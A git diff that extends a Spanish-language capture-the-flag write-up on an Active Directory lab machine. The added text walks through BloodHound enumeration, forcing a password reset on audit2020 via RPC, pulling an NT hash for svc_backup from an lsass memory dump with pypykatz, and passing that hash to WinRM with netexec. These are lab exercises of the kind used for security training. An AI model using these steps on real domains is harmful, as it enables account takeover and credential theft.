@@ -151,7 +151,59 @@ Si supieramos la contraseña del usuario svc_backup podriamos usarlo para entrar
 Vamos a usar la herramienta bloodhound que funciona con neo4j para visualizar mejor la información del active directory que corre por detrás de la máquina
 Para instalarlo en parrot podemos seguir los pasos de esta página 
 https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart
+Cuando lo arranquemos vamos a usar la herramienta bloodhound.py para sacar información del AD
 
+```bash
+python3 bloodhound.py -c all -u '<USUARIO>' -p '<CONTRASEÑA>' -d <DOMINIO> -ns <IP>
+```
+Con todo lo que nos dan lo subimos a la web http://localhost:8080
+
+Ahora buscamos el usuario support que es el que tenemos la contraseña para ver que tipo de permisos tiene.
+Si investigamos un poco vemos que el usuario support puede cambiarle la contraseña al usuario audit2020 por lo que nos podemos hacer con el.
+
+![bloodhound](images/10_bloodhound.png)
+
+Vamos a aprovechar que tenemos el rpc abierto y a través de ahi cambiarle la contraseña al usuario.
+
+```bash
+net rpc password <USUARIO_CAMBIAR_CONTRASEÑA> -U '<USUARIO_CON_PERMISOS>' -S 10.129.229.17
+```
+Nos pide una contraseña y tiene que tener una cierta regla de seguridad. Nos bastará con la contraseña
+test123$¡
+
+![contraseña](images/11_cambio_contraseña.png)
+
+# 🌐 Salto de usuario
+
+Ahora tenemos control del usuario audit2020.
+Vamos a listar los recursos compartidos con smbmap
+
+![smbmap](images/12_smb_audit2020.png)
+
+Tenemos un recurso llamado forensic, vamos a verlo.
+Luego vemos otro recurso llamado memory_analysis que también lo listaremos.
+
+![memory](images/13_memory_analysis.png)
+
+Aqui vemos un archivo interesante llamado lsass.zip.
+Este archivo hay veces que nos reporta hashes del sistema de algunos usuarios.
+Descargamos el archivo y lo extraemos.
+Si le hacemos un file veremos el tipo que es.
+
+```bash
+$ file lsass.DMP
+lsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 type
+```
+Y es mini dump. Ya con esto podemos usar una herramienta llamada pypykatz
+
+![pypykatz](images/14_pypykatz.png)
+
+Vemos que nos dan un hash NT del usuario svc_backup. Con esto vamos a ver si nos podemos autenticar en winrm
+
+```bash
+netexec winrm 10.129.229.17 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
+``` 
+![pwned](images/15_pwned.png)
 
 
 # 🌐 Enumeración web 3
